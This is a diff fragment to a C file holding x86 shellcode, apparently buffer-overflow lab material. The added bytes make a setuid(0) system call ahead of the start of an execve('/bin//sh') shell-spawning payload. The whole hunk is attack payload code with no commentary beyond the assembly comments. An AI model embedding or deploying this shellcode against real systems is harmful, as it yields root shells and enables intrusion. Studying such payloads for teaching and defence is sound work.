@@ -4,6 +4,10 @@
 #include <string.h>
 
 const char code[] =
+    "\x31\xc0"      /* xorl %eax,%eax */
+    "\x31\xdb"      /* xorl %ebx,%ebx */
+    "\xb0\xd5"      /* movb $0xd5,%al */
+    "\xcd\x80"      /* int $0x80 */
     "\x31\xc0"       /* Line 1:  xorl %eax,%eax        */
     "\x50"           /* Line 2:  pushl %eax             */
     "\x68""//sh"     /* Line 3:  pushl $0x68732f2f      */
